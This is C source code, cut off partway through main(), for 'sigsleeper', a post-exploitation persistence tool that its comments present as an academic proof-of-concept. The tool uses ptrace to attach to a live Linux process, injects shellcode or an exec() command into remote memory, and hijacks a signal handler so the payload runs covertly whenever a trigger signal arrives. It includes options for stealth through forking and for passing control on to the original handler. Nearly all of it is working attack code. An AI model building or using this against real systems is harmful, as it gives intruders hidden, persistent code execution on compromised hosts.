
/**********************************************************************************************************************
 * 
 * sigsleeper
 * 
 * emptymonkey's tool for malicious signal-handler injection.
 * 
 * 2013-09-20
 * 
 * 
 * sigsleeper is intended as a post-exploitation tool to assist with the problem of persistence. It is a
 * proof-of-concept meant to explore the sort of persistence mechanisms for Linux environments that we can expect to
 * see coming out of the APT space. It has not been used by the author outside of an academic instruction / demo
 * context.
 *
 * Your mileage may vary.
 *
 *
 * sigsleeper is a tool for injecting shellcode into the memory of a process that already exists. After placing this
 * "payload" code in the target's memory, it then sets up a signal handler to call that payload anytime a "trigger"
 * SIGNAL is delivered.
 *
 * sigsleeper provides a '-e' switch to execute a COMMAND instead of shellcode. 
 *
 * sigsleeper provides a '-o' switch which will configure the target process to run the original signal handler after
 * ours has completed. (This, in essence, sets up our signal handler as a mitm.)
 *
 * sigsleeper provides a '-f' switch which will wrap the payload in fork() shellcode, allowing the payload to be run
 * in a child process. This ensures the target process doesn't block when the payload is launched. (If you are looking
 * for stealth, you will need to weigh the latency of the target processess responses with the lifespan of the
 * payload, and the level of awareness held by the sysadmins of that target host.)
 * 
 * 
 * The basic tactic we take to achieve all of this is as follows:
 *	- Set up as much of the shellcode as possible ahead of time to minimize the duration we are PTRACE_ATTACHed.
 *	- Use ptrace() to attach to the target.
 *	- Use ptrace() to request the needed memory with a remote mmap().
 *	- Use ptrace() to PTRACE_POKEDATA copy the shellcode into the remote memory. 
 *	- Use ptrace() to call a remote mprotect() and make the memory executable.
 *	- Use ptrace() to call a remote sigaction() to set our new signal handler.
 * 
 * As you can see, ptrace() is used as the main vector of this "attack". There are no "exploits" here.
 * 
 * 
 * The remote mmap() call will give us a chunk of memory which we will break up into segments, as follows:
 *	("base_address" is the memory location returned by the remote mmap() call.)
 * 
 *                      base_address  -> -------------------
 *                                       | **argv + *argv  | <- Only exists in -e case.
 *                                       |                 |    Contains argv version of COMMAND.
 *                                       -------------------
 *                                       | payload         | <- Either contains shellcode from stdin, or exec()
 *                                       |                 |    shellcode in the -e case.
 *                                       -------------------
 *                                       | default_handler | <- Only exists in the -o case where the original signal
 *                                       |                 |    handler is SIG_DFL, SIG_IGN, or SIG_ERR.
 * execution starts here:  (-f || -o) -> -------------------
 *                                       | payload_open    | <- If -f, then this contains the fork() shellcode.
 *                                       |                 |    If -o but not -f, then we save register contents for
 * execution starts here: !(-f || -o) -> -------------------    later use by the original signal handler.
 *                                       | call_payload    |  
 *                                       |                 |
 *                                       -------------------
 *                                       | payload_close   | <- Contains shellcode. Either we exit(), return(), or
 *                                       |                 |    call the origninal signal handler then return.
 *   indirectly called by the kernel  -> -------------------
 *                                       | sigreturn       | <- Trampoline. Asks the kernel to restore the pre-signal
 *                                       |                 |    execution context and resume execution.
 *       base_address + input_len + 1 -> -------------------
 *
 *
 * The sequence of "payload_open -> call_payload -> payload_close" can be thought of as the new signal handler, and
 * is responsible for execution control. Then "payload" and "default_handler" just become subroutine segments 
 * that are called to and returned from. The end of payload_close will normally have a return call, which pops the
 * sigreturn address off the stack and into the instruction pointer. (It was placed onto the stack by the kernel
 * during the initial signal delivery). Once inside the sigreturn segment, the sigreturn() syscall is itself called.
 * This invokes the kernel in order to restore the original execution state. The program will then continue along as
 * it did before the signal had been delivered.
 * 
 * 
 * The name is a reference to a sleeper cell style payload that waits for the signal to take action. Originally it was
 * called "sigpwn", which I loved. Unfortunately, given that no actual pwning takes place, I felt compelled to change 
 * it. 
 * 
 * 
 **********************************************************************************************************************/



#include "sigsleeper.h"
#include "shellcode-snippets.h"
#include "libptrace_do.h"



char *CALLING_CARD = "@emptymonkey - https://github.com/emptymonkey";



int global_debug = 0;


const struct sigmap_element sigmap[] = {
  {"SIGHUP",    SIGHUP,     ACTION_TERMINATE},
  {"SIGINT",    SIGINT,     ACTION_TERMINATE},
  {"SIGQUIT",   SIGQUIT,    ACTION_COREDUMP},
  {"SIGILL",    SIGILL,     ACTION_COREDUMP},
  {"SIGTRAP",   SIGTRAP,    ACTION_COREDUMP},
  {"SIGABRT",   SIGABRT,    ACTION_COREDUMP},
  {"SIGIOT",    SIGIOT,     ACTION_COREDUMP},
  {"SIGBUS",    SIGBUS,     ACTION_COREDUMP},
  {"SIGFPE",    SIGFPE,     ACTION_COREDUMP},
  {"SIGKILL",   SIGKILL,    ACTION_TERMINATE},
  {"SIGUSR1",   SIGUSR1,    ACTION_TERMINATE},
  {"SIGSEGV",   SIGSEGV,    ACTION_COREDUMP},
  {"SIGUSR2",   SIGUSR2,    ACTION_TERMINATE},
  {"SIGPIPE",   SIGPIPE,    ACTION_TERMINATE},
  {"SIGALRM",   SIGALRM,    ACTION_TERMINATE},
  {"SIGTERM",   SIGTERM,    ACTION_TERMINATE},
  {"SIGSTKFLT", SIGSTKFLT,  ACTION_TERMINATE},
  {"SIGCLD",    SIGCLD,     ACTION_IGNORE},
  {"SIGCHLD",   SIGCHLD,    ACTION_IGNORE},
  {"SIGCONT",   SIGCONT,    ACTION_IGNORE},
  {"SIGSTOP",   SIGSTOP,    ACTION_STOP},
  {"SIGTSTP",   SIGTSTP,    ACTION_STOP},
  {"SIGTTIN",   SIGTTIN,    ACTION_STOP},
  {"SIGTTOU",   SIGTTOU,    ACTION_STOP},
  {"SIGURG",    SIGURG,     ACTION_IGNORE},
  {"SIGXCPU",   SIGXCPU,    ACTION_COREDUMP},
  {"SIGXFSZ",   SIGXFSZ,    ACTION_COREDUMP},
  {"SIGVTALRM", SIGVTALRM,  ACTION_TERMINATE},
  {"SIGPROF",   SIGPROF,    ACTION_TERMINATE},
  {"SIGWINCH",  SIGWINCH,   ACTION_IGNORE},
  {"SIGPOLL",   SIGPOLL,    ACTION_TERMINATE},
  {"SIGIO",     SIGIO,      ACTION_TERMINATE},
  {"SIGPWR",    SIGPWR,     ACTION_TERMINATE},
  {"SIGSYS",    SIGSYS,     ACTION_COREDUMP},
  {"SIGUNUSED", SIGUNUSED,  ACTION_COREDUMP},
  {"",          0,          0}
};



int add_shellcode(struct ptrace_pokedata *shellcode, char *buffer);
char **string_to_vector(char *command_string);
int sig_string_to_int(char *sig_string);



/**********************************************************************************************************************
 *
 * void usage()
 *
 * Input: None.
 *
 * Output: Usage information printed to stderr.
 *
 * Purpose: The program does not believe it has been invoked correctly. This function will help clarify how the 
 *	program can be used.
 *
 **********************************************************************************************************************/
void usage(){
	fprintf(stderr, "\nUsage: %s [-s SIGNAL] [-o] [-f] [-e COMMAND] [-d] PID\n\n", program_invocation_short_name);
	fprintf(stderr, "\t-s SIGNAL  : Use SIGNAL as the trigger. Signal name, short name, or number are all accepted. (SIGUSR1 is the default).\n");
	fprintf(stderr, "\t-o         : Invoke the original signal handler after running our payload.\n");
	fprintf(stderr, "\t-f         : Add fork() shellcode so that the payload runs in a child process, ensuring the original process does not block.\n");
	fprintf(stderr, "\t-e COMMAND : Use exec() shellcode to launch COMMAND for the payload instead of reading from stdin.\n");
	fprintf(stderr, "\t           : This option requires that COMMAND have an absolute path.\n");
	fprintf(stderr, "\t-d         : Display debug output.\n");
	fprintf(stderr, "\nNote: Without the '-f' flag, the target process will be consumed if your shellcode contains an exec(), or if you invoke the '-e' flag above.\n");
	fprintf(stderr, "Note: Shellcode can be passed directly to %s on stdin. As your shellcode will be called as a function, all you need is a \"ret\" at the end.\n", program_invocation_short_name);
	fprintf(stderr, "\nExample: %s -s SIGHUP -o -f -e '/bin/echo Hello world!' `pgrep target`\n", program_invocation_short_name);
	fprintf(stderr, "\n");
	exit(-1);
}



/**********************************************************************************************************************
 *
 * int main(int argc, char **argv)
 *
 *	Input:
 *		The command line arguments, and their count.
 *
 * 	Output:
 *		Nothing, unless you enable debugging.
 *
 *	Purpose:
 *		main() runs the show. For a more general purpose overview of the program, refer to the opening comment section.
 *
 *	Assumptions:
 *		main() uses several helper functions that are included with this repo:
 *			add_shellcode()
 *			string_to_vector()
 *			sig_string_to_int()
 *
 *		It also needs access to the ptrace_do library of functions. These do the heavy lifting for the ptrace syscalls.
 *		The ptrace_do repository can be found at:
 *			https://github.com/emptymonkey/ptrace_do
 *
 *
 *	Code Structure Overview:
 *		- Do some basic initialization.
 *		- Set up options.
 *		- Check usage.
 *		- Convert SIGNAL to a number.
 *		- Grab the sigmap element for this SIGNAL.
 *		- Prepare the shellcode needed for the payload code section of memory.
 *		- Prepare shellcode for the optional payload_open section of memory.
 *		- Prepare shellcode for the call_payload section of memory.
 *		- Prepare shellcode for the sigreturn section of memory.
 *		- Attach to the remote process.
 *		- Allocate some temporary remote memory for use in the sigaction calls.
 *		- Examine the remote signal handler.
 *		- Set up shellcode for default_signal_handler.
 *		- Set up the shellcode for the payload_close section.
 *		- Prepare shellcode for the default_signal_handler section of memory.
 *		- Replace SIGNAL_NUMBER_PLACEHOLDER_NUM values.
 *		- Allocate the total remote memory needed.
 *		- Push the remote argv payload to remote memory.
 *		- Push the payload shellcode to remote memory.
 *		- Push the default_handler shellcode to remote memory.
 *		- Replace HANDLER_ADDR_PLACEHOLDER_NUM values.
 *		- Push the payload_open shellcode to remote memory.
 *		- Push the call_payload shellcode to remote memory.
 *		- Replace PAYLOAD_ADDR_PLACEHOLDER_NUM values.
 *		- Push the payload_close shellcode to remote memory.
 *		- Push the sigreturn shellcode to remote memory.
 *		- Change remote memory permissions from read/write to read/execute.
 *		- Set up the new sigaction act struct.
 *		- Push the new sigaction act struct to remote temporary memory.
 *		- Call sigaction() remotely.
 *		- Clean up temporary remote memory and unneeded local data structures related to ptrace_do.
 *		- Detatch from the remote process.
 *		- exit()
 *
 **********************************************************************************************************************/
int main(int argc, char **argv){

	int i, j;

	int retval_int;
	long retval_long;
	char *retval_string_ptr;
	unsigned long retval_ulong;

	int opt;

	char *signal_opt;
	int call_orig_handler;
	int run_forked;
	int do_exec;

	struct sigmap_element *signal_trigger_element;
	int tmp_int;

	int target_pid;
	int exit_val = 0;

	// Remote argv payload section (optional per -e flag.)
	char *command_string;
	struct argv_payload *remote_argv;

	// Payload section.
	int payload_buffer_size, payload_buffer_index;
	char *payload_buffer;
	char tmp_char;
	char *exec_buffer = EXEC_SHELLCODE;

	// default_signal_handler section. (optional per certain -o flag cases.)
	char *default_signal_handler_buffer;
	char *ret_success_buffer = RET_SUCCESS_SHELLCODE;
	char *ret_fail_buffer = RET_FAIL_SHELLCODE;
	char *raise_signal_buffer = RAISE_SIGNAL_SHELLCODE;

	// payload_open section. (Optional, per -f or -o flags.)
	char *fork_buffer;
	char *fork_with_ret_buffer = FORK_WITH_RET_SHELLCODE;
	char *fork_with_call_handler_buffer = FORK_WITH_CALL_HANDLER_SHELLCODE;
	char *save_sig_context_buffer = SAVE_SIG_CONTEXT_SHELLCODE;

	// call_payload subsection. This section is non-optional.
	char *call_payload_buffer = CALL_PAYLOAD_SHELLCODE;

	// payload_close subsection. This section is non-optional
	char *payload_close_buffer;
	char *call_handler_buffer = CALL_HANDLER_SHELLCODE;
	char *exit_buffer = EXIT_SHELLCODE;

	// Sigreturn section.
	char *sigreturn_buffer = SIGRETURN_SHELLCODE;

	struct ptrace_pokedata *payload_shellcode;
	struct ptrace_pokedata *default_signal_handler_shellcode;
	struct ptrace_pokedata *payload_open_shellcode;
	struct ptrace_pokedata *call_payload_shellcode;
	struct ptrace_pokedata *payload_close_shellcode;
	struct ptrace_pokedata *sigreturn_shellcode;

	int sa_resethand_flag;

	unsigned long tmp_ptrace_data;

	size_t input_len;
	struct ptrace_do *target;

	struct data_node *this;

	unsigned long base_remote_address;
	int remote_index;

	struct kernel_sigaction *act;
	void *remote_act;


	/*
	 * - Do some basic initialization.
	 * - Set up options.
	 * - Check usage.
	 */

	signal_opt = NULL;
	call_orig_handler = 0;
	run_forked = 0;
	command_string = NULL;
	do_exec = 0;

	while ((opt = getopt(argc, argv, "ds:ofe:")) != -1) {
		switch (opt) {

			case 'd':
				global_debug = 1;

			// -s SIGNAL : Use SIGNAL as the trigger. (Default is SIGUSR1.)
			// -o : Call the original signal handler once our payload has finished.
			case 's':
				signal_opt = optarg;
				break;
			case 'o':
				call_orig_handler = 1;
				break;

				// -f : Fork a child process and run our payload in the child.
			case 'f':
				run_forked = 1;
				break;

				// -e COMMAND : Set shellcode payload to exec COMMAND.
			case 'e':
				command_string = optarg;
				do_exec = 1;
				break;

			default:
				usage();
		}
	}

	if((argc - optind) != 1){
		usage();
	}

	if(!(target_pid = strtol(argv[optind], NULL, 10))){
		usage();
	}

	if(global_debug){
		printf("\n### Global Debug Output ###\n");
		printf("options:\n");
		printf("\ttarget_pid: %d\n", target_pid);
		printf("\tsignal_opt: %s\n", signal_opt);
		printf("\tcall_orig_handler: %d\n", call_orig_handler);
		printf("\trun_forked: %d\n", run_forked);
		printf("\tdo_exec: %d\n", do_exec);
		printf("\tcommand_string: %s\n", command_string);
	}


	/*
	 * - Convert SIGNAL to a number.
	 * - Grab the sigmap element for this SIGNAL.
	 */

	if((signal_trigger_element = (struct sigmap_element *) calloc(1, sizeof(struct sigmap_element))) == NULL){
		error(-1, errno, "calloc(1, %d)", (int) sizeof(struct sigmap_element));
	}

	if((signal_trigger_element->name = (char *) calloc(MAX_SIGNAL_NAME_LEN + 1, sizeof(char))) == NULL){
		error(-1, errno, "calloc(%d, %d)", MAX_SIGNAL_NAME_LEN + 1, (int) sizeof(char));
	}

	if(signal_opt){

		// Is it a simple number string?
		tmp_int = 0;
		errno = 0;
		tmp_int = strtol(signal_opt, NULL, 10);
		if(errno){
			error(-1, errno, "strtol(%lx, NULL, 10)", (unsigned long) signal_opt);
		}

		// Is it a "POSIX reliable signal" name?
		if(!tmp_int){
			if((tmp_int = sig_string_to_int(signal_opt)) == -1){
				error(-1, errno, "sig_string_to_int(%s)", signal_opt);
			}
		}

		// Is it a "POSIX real-time signal" name?
		if(!tmp_int || tmp_int >= SIGRTMIN){

			if(!tmp_int){
				if((!strncmp("SIGRTMIN+", signal_opt, 9)) || (!strncmp("RTMIN+", signal_opt, 6))){


					retval_string_ptr = strchr(signal_opt, '+');

					errno = 0;
					tmp_int = strtol(retval_string_ptr + 1, NULL, 10);

					if(errno){
						error(-1, errno, "strtol(%lx, NULL, 10)", (unsigned long) (retval_string_ptr + 1));
					}

					tmp_int += SIGRTMIN;
				}

			}

			if((SIGRTMIN <= tmp_int) && (tmp_int <= SIGRTMAX)){
				snprintf(signal_trigger_element->name, MAX_SIGNAL_NAME_LEN, "SIGRTMIN+%d", tmp_int - SIGRTMIN);
				signal_trigger_element->number = tmp_int;
				signal_trigger_element->default_action = ACTION_TERMINATE;
			}
		}

		if(tmp_int){
			if(!signal_trigger_element->number){
				for(i = 0; sigmap[i].number; i++){
					if(sigmap[i].number == tmp_int){
						memcpy(signal_trigger_element, &sigmap[i], sizeof(struct sigmap_element));
						break;
					}
				}
			}

		}else{
			error(-1, 0, "Error: Unknown signal: %s", signal_opt);
		}


	}else{
		for(i = 0; sigmap[i].number; i++){
			if(sigmap[i].number == DEFAULT_SIGNAL){
				memcpy(signal_trigger_element, &sigmap[i], sizeof(struct sigmap_element));
				break;
			}
		}
	}

	// Do a sanity check for the signal_trigger_element.
	if(!signal_trigger_element->number){
		error(-1, 0, "Error: Unknown signal: %s", signal_opt);
	}

	// If only we could...
	if((signal_trigger_element->number == SIGKILL) || (signal_trigger_element->number == SIGSTOP)){
		error(-1, 0, "The SIGNAL trigger cannot be either SIGKILL or SIGSTOP.");
	}

	if(global_debug){
		printf("\nsignal information:\n");
		printf("\tsignal_trigger_element->number: %d\n", signal_trigger_element->number);
		printf("\tsignal_trigger_element->name: %s\n", signal_trigger_element->name);
		printf("\tsignal_trigger_element->default_action: %d\n", signal_trigger_element->default_action);
	}


	/*
	 * - Prepare the shellcode needed for the payload code section of memory.
	 */

	input_len = 0;
	remote_argv = NULL;
	if(do_exec){

		// Setup the data structures needed for the execve() case.
		if(command_string[0] != '/'){
			fprintf(stderr, "%s: The -e switch requires an absolute path. Stopping.\n", program_invocation_short_name);
			usage();
		}

		if((remote_argv = (struct argv_payload *) calloc(1, sizeof(struct argv_payload))) == NULL){
			error(-1, errno, "calloc(1, %d)", (int) sizeof(struct argv_payload));
		}

		if((remote_argv->command_string_vector = string_to_vector(command_string)) == NULL){
			error(-1, errno, "string_to_vector(%lx)", (unsigned long) command_string);
		}

		while(remote_argv->command_string_vector[remote_argv->argc]){
			remote_argv->argc++;
		}

		if((remote_argv->word_counts = (int *) calloc(remote_argv->argc, sizeof(int))) == NULL){
			error(-1, errno, "calloc(%d, %d)", remote_argv->argc, (int) sizeof(int));
		}

		if((remote_argv->remote_string_addresses = (unsigned long *) calloc(remote_argv->argc, sizeof(unsigned long))) == NULL){
			error(-1, errno, "calloc(%d, %d)", remote_argv->argc, (int) sizeof(unsigned long));
		}

		tmp_int = 0;
		for(i = 0; i < remote_argv->argc; i++){
			if(remote_argv->command_string_vector[i]){
				tmp_int = strlen(remote_argv->command_string_vector[i]) + 1;
				while(tmp_int % sizeof(long)){
					tmp_int++;
				}
			}
			remote_argv->word_counts[i] = tmp_int / BYTES_PER_WORD;
			input_len += tmp_int;
		}

		input_len += (remote_argv->argc * BYTES_PER_WORD);
	}

	// The payload_buffer is our general use shellcode buffer. We use it both in the case of stdin and execve().
	payload_buffer_size = getpagesize();

	// The buffer passed to add_shellcode() needs to have an odd size. 2 hex chars per byte of shellcode, plus one
	// more char for NULL termination. Here we are trying to setup a generic scratch buffer that fits that
	// requirement while staying within one page of memory. In addition, we'll want it to contain whole words, so
	// lets also make that mod 16.
	while((payload_buffer_size - 1) % (2 * BYTES_PER_WORD)){
		payload_buffer_size--;
	}

	if((payload_buffer = (char *) calloc(payload_buffer_size, sizeof(char))) == NULL){
		error(-1, errno, "calloc(%d, %d)", payload_buffer_size, (int) sizeof(char));
	}

	if((payload_shellcode = (struct ptrace_pokedata *) calloc(1, sizeof(struct ptrace_pokedata))) == NULL){
		error(-1, errno, "calloc(1, %d)", (int) sizeof(struct ptrace_pokedata));
	}

	payload_buffer_index = 0;

	if(do_exec){

		// Setup the execve() shellcode. Remember, we still have dummy placeholder values in there.
		if((retval_int = add_shellcode(payload_shellcode, exec_buffer)) == -1){
			error(-1, errno, "add_shellcode(%lx, %lx)", (unsigned long) payload_shellcode, (unsigned long) payload_buffer);
		}
		input_len = BYTES_PER_WORD * payload_shellcode->node_count;

		// Grab the shellcode in the stdin case.
	}else{
		while((retval_int = read(STDIN_FILENO, &tmp_char, 1)) == 1){

			// We don't care which of the shellcode formats we get as input.
			// If it's a hex digit, we'll take it.
			if(isxdigit(tmp_char)){
				if(payload_buffer_index == payload_buffer_size - 1){
					if((retval_int = add_shellcode(payload_shellcode, payload_buffer)) == -1){
						error(-1, errno, "add_shellcode(%lx, %lx)", (unsigned long) payload_shellcode, (unsigned long) payload_buffer);
					}
					memset(payload_buffer, 0, payload_buffer_size);
					payload_buffer_index = 0;
				}
				payload_buffer[payload_buffer_index++] = tmp_char;
			}
		}

		if(retval_int == -1){
			error(-1, errno, "read(STDIN_FILENO, %lx, 1)", (unsigned long) &tmp_char);
		}	

		if(payload_buffer_index){

			if((retval_int = add_shellcode(payload_shellcode, payload_buffer)) == -1){
				error(-1, errno, "add_shellcode(%lx, %lx)", (unsigned long) payload_shellcode, (unsigned long) payload_buffer);
			}
		}
		input_len = BYTES_PER_WORD * payload_shellcode->node_count;
	}


	/*
	 * Note: we do not prepare the optional default_signal_handler shellcode here. We can't set it up until we know which
	 * of the -o sub-cases we are in. That won't happen until after we have inspected the remote processes current signal
	 * handler.
	 */


	/*
	 * - Prepare shellcode for the optional payload_open section of memory.
	 */

	if((payload_open_shellcode = (struct ptrace_pokedata *) calloc(1, sizeof(struct ptrace_pokedata))) == NULL){
		error(-1, errno, "calloc(1, %d)", (int) sizeof(struct ptrace_pokedata));
	}

	if(run_forked){
		fork_buffer = fork_with_ret_buffer;
		if(call_orig_handler){
			fork_buffer = fork_with_call_handler_buffer;
		}

		if((retval_int = add_shellcode(payload_open_shellcode, fork_buffer)) == -1){
			error(-1, errno, "add_shellcode(%lx, %lx)", (unsigned long) payload_open_shellcode, (unsigned long) fork_buffer);
		}
		input_len += BYTES_PER_WORD * payload_open_shellcode->node_count;

	}else if(call_orig_handler){
		if((retval_int = add_shellcode(payload_open_shellcode, save_sig_context_buffer)) == -1){
			error(-1, errno, "add_shellcode(%lx, %lx)", (unsigned long) payload_open_shellcode, (unsigned long) save_sig_context_buffer);
		}
		input_len += BYTES_PER_WORD * payload_open_shellcode->node_count;
	}


	/*
	 * - Prepare shellcode for the call_payload section of memory.
	 */

	if((call_payload_shellcode = (struct ptrace_pokedata *) calloc(1, sizeof(struct ptrace_pokedata))) == NULL){
		error(-1, errno, "calloc(1, %d)", (int) sizeof(struct ptrace_pokedata));
	}

	if((retval_int = add_shellcode(call_payload_shellcode, call_payload_buffer)) == -1){
		error(-1, errno, "add_shellcode(%lx, %lx)", (unsigned long) call_payload_shellcode, (unsigned long) call_payload_buffer);
	}
	input_len = BYTES_PER_WORD * call_payload_shellcode->node_count;


	/*
	 * Note: We do not prepare the payload_close shellcode here. Rather, as it can be related to the original
	 * signal handler code, we will deal with this case after the remote sigaction. Granted, not all of the
	 * payload_close cases need to wait, but it felt confusing to bifurcate it. I'd rather it was all handled 
	 * together in one spot.
	 */


	/*
	 * - Prepare shellcode for the sigreturn section of memory.
	 */

	if((sigreturn_shellcode = (struct ptrace_pokedata *) calloc(1, sizeof(struct ptrace_pokedata))) == NULL){
		error(-1, errno, "calloc(1, %d)", (int) sizeof(struct ptrace_pokedata));
	}

	if((retval_int = add_shellcode(sigreturn_shellcode, sigreturn_buffer)) == -1){
		error(-1, errno, "add_shellcode(%lx, %lx)", (unsigned long) sigreturn_shellcode, (unsigned long) sigreturn_buffer);
	}
	input_len = BYTES_PER_WORD * sigreturn_shellcode->node_count;


	/* PTRACE_ATTACH happens here!
	 *
	 * - Attach to the remote process.
	 * - Allocate some temporary remote memory for use in the sigaction calls.
	 */

	if((target = ptrace_do_init(target_pid)) == NULL){
		fprintf(stderr, "%s: main(): ptrace_do_init(%d): %s\n", program_invocation_short_name, target_pid, strerror(errno));
		exit(-1);
	}

	if((act = ptrace_do_malloc(target, sizeof(struct kernel_sigaction))) == NULL){
		fprintf(stderr, "%s: main(): ptrace_do_malloc(%lx, %d): %s\n", program_invocation_short_name, (unsigned long) target, (int) sizeof(struct kernel_sigaction), strerror(errno));
		exit_val = -1;
		goto CLEAN_UP;
	}


	/*
	 * - Examine the remote signal handler.
	 * - Set up shellcode for default_signal_handler.
	 * - Set up the shellcode for the payload_close section.
	 */

	// Default payload_close case: No fork, no handler. Just close out the payload with a simple ret call.
	payload_close_buffer = ret_success_buffer;

	default_signal_handler_buffer = NULL;

	sa_resethand_flag = 0;

	if(call_orig_handler){

		if((remote_act = ptrace_do_get_remote_addr(target, act)) == NULL){
			fprintf(stderr, "%s: main(): ptrace_do_get_remote_addr(%lx, %lx: %s\n", program_invocation_short_name, (unsigned long) target, (unsigned long) act, strerror(errno));
			exit_val = -1;
			goto CLEAN_UP;
		}

		errno = 0;
		retval_ulong = ptrace_do_syscall(target, __NR_rt_sigaction, signal_trigger_element->number, 0, (unsigned long) remote_act, KERNEL_SIGSETSIZE, 0, 0);
		if(errno){
			fprintf(stderr, "%s: main(): ptrace_do_syscall(%lx, __NR_rt_sigaction, %d, 0, %lx, %d, 0, 0): %s\n", program_invocation_short_name, (unsigned long) target, signal_trigger_element->number, (unsigned long) remote_act, (int) sizeof(sigset_t), strerror(errno));
			exit_val = -1;
			goto CLEAN_UP;
		}

		if((long) retval_ulong < 0){
			fprintf(stderr, "%s: main(): remote sigaction() failed: %s\n", program_invocation_short_name, strerror(-retval_ulong));
			exit_val = -1;
			goto CLEAN_UP;
		}

		if((remote_act = ptrace_do_pull_mem(target, act)) == NULL){
			fprintf(stderr, "%s: main(): ptrace_do_pull_mem(%lx, %lx): %s\n", program_invocation_short_name, (unsigned long) target, (unsigned long) act, strerror(errno));
			exit_val = -1;
			goto CLEAN_UP;
		}

		// We still have to setup our payload_close_buffer and shellcode. 
		// The default action will be to directly call the original sig handler.
		// There is no default_signal_handeler shellcode to worry about in this case.
		payload_close_buffer = call_handler_buffer;

		// Here are the tactics we will take for each disposition:
		//		SIG_ERR: Fail return.
		//		SIG_DFL: Handle the default action.
		//		SIG_IGN: Succesful return.
		if((long) act->k_sa_handler == (long) SIG_ERR){
			payload_close_buffer = ret_fail_buffer;
		}

		if((long) act->k_sa_handler == (long) SIG_DFL){
			// Here are the tactics we will take for each default action:
			//		ACTION_IGNORE:    Succesful return.
			//		ACTION_TERMINATE: Set SA_RESETHAND during injection, then raise SIGNAL.
			//		ACTION_COREDUMP:  Set SA_RESETHAND during injection, then raise SIGNAL.
			//		ACTION_STOP:      Set SA_RESETHAND during injection, then raise SIGNAL.

			if(signal_trigger_element->default_action == ACTION_IGNORE){
				payload_close_buffer = ret_success_buffer;

			}else if(
					(signal_trigger_element->default_action == ACTION_TERMINATE) || \
					(signal_trigger_element->default_action == ACTION_COREDUMP)  || \
					(signal_trigger_element->default_action == ACTION_STOP)
					){

				sa_resethand_flag = SA_RESETHAND;
				payload_close_buffer = call_handler_buffer;

				default_signal_handler_buffer = raise_signal_buffer;

			}else{
				fprintf(stderr, "%s: Unlikely error: Remote signal handler is set to SIG_DFL, but we can find a corresponding default action for signal: %s\n", program_invocation_short_name, signal_trigger_element->name);
			}
		}

		if((long) act->k_sa_handler == (long) SIG_IGN){
			payload_close_buffer = ret_success_buffer;
		}

		// Forked case: We've already added the call handler code as part of the fork_shellcode.
		// Now just add an exit() call at the end of the payload. (Children shouldn't live on past their payload life.)
	}else if(run_forked){
		payload_close_buffer = exit_buffer;
	}

	if((payload_close_shellcode = (struct ptrace_pokedata *) calloc(1, sizeof(struct ptrace_pokedata))) == NULL){
		error(-1, errno, "calloc(1, %d)", (int) sizeof(struct ptrace_pokedata));
	}

	if((retval_int = add_shellcode(payload_close_shellcode, payload_close_buffer)) == -1){
		error(-1, errno, "add_shellcode(%lx, %lx)", (unsigned long) payload_close_shellcode, (unsigned long) payload_close_buffer);
	}
	input_len = BYTES_PER_WORD * payload_close_shellcode->node_count;


	/*
	 * - Prepare shellcode for the default_signal_handler section of memory.
	 * - Replace SIGNAL_NUMBER_PLACEHOLDER_NUM values.
	 */

	default_signal_handler_shellcode = NULL;
	if(sa_resethand_flag){
		if((default_signal_handler_shellcode = (struct ptrace_pokedata *) calloc(1, sizeof(struct ptrace_pokedata))) == NULL){
			error(-1, errno, "calloc(1, %d)", (int) sizeof(struct ptrace_pokedata));
		}

		if((retval_int = add_shellcode(default_signal_handler_shellcode, default_signal_handler_buffer)) == -1){
			error(-1, errno, "add_shellcode(%lx, %lx)", (unsigned long) call_payload_shellcode, (unsigned long) default_signal_handler_buffer);
		}
		input_len = BYTES_PER_WORD * default_signal_handler_shellcode->node_count;

		if(call_orig_handler){
			this = default_signal_handler_shellcode->head;
			while(this){
				if(this->ptrace_word == SIGNAL_NUMBER_PLACEHOLDER_NUM){
					this->ptrace_word = (unsigned long) signal_trigger_element->number;
					break;
				}
				this = this->next;
			}
		}
	}


	/*
	 * - Allocate the total remote memory needed.
	 */

	errno = 0;
	base_remote_address = ptrace_do_syscall(target, __NR_mmap, (unsigned long) NULL, input_len, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	if(errno){
		fprintf(stderr, "%s: main(): ptrace_do_syscall(%lx, __NR_mmap, NULL, %d, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0): %s\n", program_invocation_short_name, (unsigned long) target, (int) input_len, strerror(errno));
		exit_val = -1;
		goto CLEAN_UP;
	}

	if((long) base_remote_address < 0){
		fprintf(stderr, "%s: main(): remote mmap() failed: %s\n", program_invocation_short_name, strerror(-base_remote_address));
		exit_val = -1;
		goto CLEAN_UP;
	}

	if(global_debug){
		printf("\nremote addresses:\n");
		printf("\tbase_remote_address: %p\n", (void *) base_remote_address);
	}


	/*
	 * - Push the remote argv payload to remote memory.
	 */

	remote_index = 0;

	// Push the remote_argv string data.
	if(do_exec){
		for(i = 0; i < remote_argv->argc; i++){
			remote_argv->remote_string_addresses[i] = base_remote_address + remote_index;

			for(j = 0; j < remote_argv->word_counts[i]; j++){
				memcpy(&tmp_ptrace_data, &(((char *) remote_argv->command_string_vector[i])[j * sizeof(long)]), sizeof(long));

				if((retval_long = ptrace(PTRACE_POKEDATA, target->pid, (void *) (base_remote_address + remote_index), (void *) tmp_ptrace_data)) == -1){
					fprintf(stderr, "%s: main(): ptrace(PTRACE_POKEDATA, %d, %lx, %lx): %s\n", program_invocation_short_name, target_pid, (unsigned long) base_remote_address + remote_index, (unsigned long) tmp_ptrace_data, strerror(errno));
					exit_val = -1;
					goto CLEAN_UP;
				}
				remote_index += BYTES_PER_WORD;
			}
		}

		if(global_debug){
			printf("\tremote_argv->remote_string_addresses: %p\n", (void *) remote_argv->remote_string_addresses);
		}

		// Now push the array of pointers to those strings.
		remote_argv->remote_argv_address = base_remote_address + remote_index;
		for(i = 0; i < remote_argv->argc; i++){
			memcpy(&tmp_ptrace_data, &(((char *) remote_argv->remote_string_addresses)[i * sizeof(long)]), sizeof(long));

			if((retval_long = ptrace(PTRACE_POKEDATA, target->pid, (void *) (base_remote_address + remote_index), (void *) tmp_ptrace_data)) == -1){
				fprintf(stderr, "%s: main(): ptrace(PTRACE_POKEDATA, %d, %lx, %lx): %s\n", program_invocation_short_name, target_pid, (unsigned long) base_remote_address + remote_index, (unsigned long) tmp_ptrace_data, strerror(errno));
				exit_val = -1;
				goto CLEAN_UP;
			}
			remote_index += BYTES_PER_WORD;
		}

		// Finally, argv itself is a NULL terminated array, so lets push a NULL.
